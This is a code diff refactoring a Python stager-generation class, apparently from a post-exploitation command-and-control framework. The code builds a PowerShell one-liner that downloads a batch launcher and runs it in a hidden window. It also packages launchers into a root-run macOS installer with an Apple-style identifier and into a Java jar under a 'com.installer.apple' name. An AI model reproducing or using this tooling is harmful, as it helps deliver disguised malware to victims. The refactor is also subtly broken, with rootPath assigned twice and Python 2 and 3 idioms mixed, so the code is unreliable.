@@ -48,11 +48,10 @@ class Stagers:
         Load stagers from the install + "/lib/stagers/*" path
         """
 
-        rootPath = "%s/lib/stagers/" % (self.mainMenu.installPath)
+        rootPath = f"{self.mainMenu.installPath}/lib/stagers/"
         pattern = '*.py'
 
-        print helpers.color("[*] Loading stagers from: %s" % (rootPath))
-
+        rootPath = "%s/lib/stagers/" % (self.mainMenu.installPath)
         for root, dirs, files in os.walk(rootPath):
             for filename in fnmatch.filter(files, pattern):
                 filePath = os.path.join(root, filename)
@@ -62,7 +61,7 @@ class Stagers:
                     continue
 
                 # extract just the module name from the full path
-                stagerName = filePath.split("/lib/stagers/")[-1][0:-3]
+                stagerName = filePath.split("/lib/stagers/")[-1][:-3]
 
                 # instantiate the module and save it to the internal cache
                 self.stagers[stagerName] = imp.load_source(stagerName, filePath).Stager(self.mainMenu, [])
@@ -81,10 +80,7 @@ class Stagers:
     def generate_launcher_fetcher(self, language=None, encode=True, webFile='http://127.0.0.1/launcher.bat', launcher='powershell -noP -sta -w 1 -enc '):
         #TODO add handle for other than powershell language
         stager = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
-        if encode:
-            return helpers.powershell_launcher(stager, launcher)
-        else:
-            return stager
+        return helpers.powershell_launcher(stager, launcher) if encode else stager
 
 
     def generate_launcher(self, listenerName, language=None, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', safeChecks='true'):
@@ -406,33 +402,31 @@ class Stagers:
         #unzip application bundle zip. Copy everything for the installer pkg to a temporary location
         currDir = os.getcwd()
         os.chdir("/tmp/")
-        f = open("app.zip","wb")
-        f.write(bundleZip)
-        f.close()
+        with open("app.zip","wb") as f:
+            f.write(bundleZip)
         zipf = zipfile.ZipFile('app.zip','r')
         zipf.extractall()
         zipf.close()
         os.remove('app.zip')
 
-        os.system("cp -r "+self.mainMenu.installPath+"/data/misc/pkgbuild/ /tmp/")
+        os.system(f"cp -r {self.mainMenu.installPath}/data/misc/pkgbuild/ /tmp/")
         os.chdir("pkgbuild")
-        os.system("cp -r ../"+AppName+".app root/Applications/")
+        os.system(f"cp -r ../{AppName}.app root/Applications/")
         os.system("chmod +x root/Applications/")
         os.system("( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload")
         os.system("chmod +x expand/Payload")
-        s = open('scripts/postinstall','r+')
-        script = s.read()
-        script = script.replace('LAUNCHER',launcher)
-        s.seek(0)
-        s.write(script)
-        s.close()
+        with open('scripts/postinstall','r+') as s:
+            script = s.read()
+            script = script.replace('LAUNCHER',launcher)
+            s.seek(0)
+            s.write(script)
         os.system("( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts")
         os.system("chmod +x expand/Scripts")
         numFiles = subprocess.check_output("find root | wc -l",shell=True).strip('\n')
         size = subprocess.check_output("du -b -s root",shell=True).split('\t')[0]
         size = int(size) / 1024
-        p = open('expand/PackageInfo','w+')
-        pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
+        with open('expand/PackageInfo','w+') as p:
+            pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
 <pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
     <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
     <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
@@ -455,11 +449,10 @@ class Stagers:
     </scripts>
 </pkg-info>
 """
-        pkginfo = pkginfo.replace('APPNAME',AppName)
-        pkginfo = pkginfo.replace('KEY1',numFiles)
-        pkginfo = pkginfo.replace('KEY2',str(size))
-        p.write(pkginfo)
-        p.close()
+            pkginfo = pkginfo.replace('APPNAME',AppName)
+            pkginfo = pkginfo.replace('KEY1',numFiles)
+            pkginfo = pkginfo.replace('KEY2',str(size))
+            p.write(pkginfo)
         os.system("mkbom -u 0 -g 80 root expand/Bom")
         os.system("chmod +x expand/Bom")
         os.system("chmod -R 755 expand/")
@@ -468,36 +461,39 @@ class Stagers:
         package = f.read()
         os.chdir("/tmp/")
         shutil.rmtree('pkgbuild')
-        shutil.rmtree(AppName+".app")
+        shutil.rmtree(f"{AppName}.app")
         return package
 
     def generate_jar(self, launcherCode):
-        file = open(self.mainMenu.installPath+'data/misc/Run.java','r')
-        javacode = file.read()
-        file.close()
+        with open(f'{self.mainMenu.installPath}data/misc/Run.java', 'r') as file:
+            javacode = file.read()
         javacode = javacode.replace("LAUNCHER",launcherCode)
-        jarpath = self.mainMenu.installPath+'data/misc/classes/com/installer/apple/'
+        jarpath = f'{self.mainMenu.installPath}data/misc/classes/com/installer/apple/'
         try:
             os.makedirs(jarpath)
         except OSError as e:
             if e.errno != errno.EEXIST:
                 raise
-            else:
-                pass
-
-        file = open(jarpath+'Run.java','w')
-        file.write(javacode)
-        file.close()
+        with open(f'{jarpath}Run.java', 'w') as file:
+            file.write(javacode)
         currdir = os.getcwd()
-        os.chdir(self.mainMenu.installPath+'data/misc/classes/')
+        os.chdir(f'{self.mainMenu.installPath}data/misc/classes/')
         os.system('javac com/installer/apple/Run.java')
-        os.system('jar -cfe '+self.mainMenu.installPath+'Run.jar com.installer.apple.Run com/installer/apple/Run.class')
+        os.system(
+            f'jar -cfe {self.mainMenu.installPath}Run.jar com.installer.apple.Run com/installer/apple/Run.class'
+        )
+
         os.chdir(currdir)
-        os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.class')
-        os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java')
-        jarfile = open('Run.jar','rb')
-        jar = jarfile.read()
-        jarfile.close()
+        os.remove(
+            f'{self.mainMenu.installPath}data/misc/classes/com/installer/apple/Run.class'
+        )
+
+        os.remove(
+            f'{self.mainMenu.installPath}data/misc/classes/com/installer/apple/Run.java'
+        )
+
+        with open('Run.jar','rb') as jarfile:
+            jar = jarfile.read()
         os.remove('Run.jar')
 
         return jar
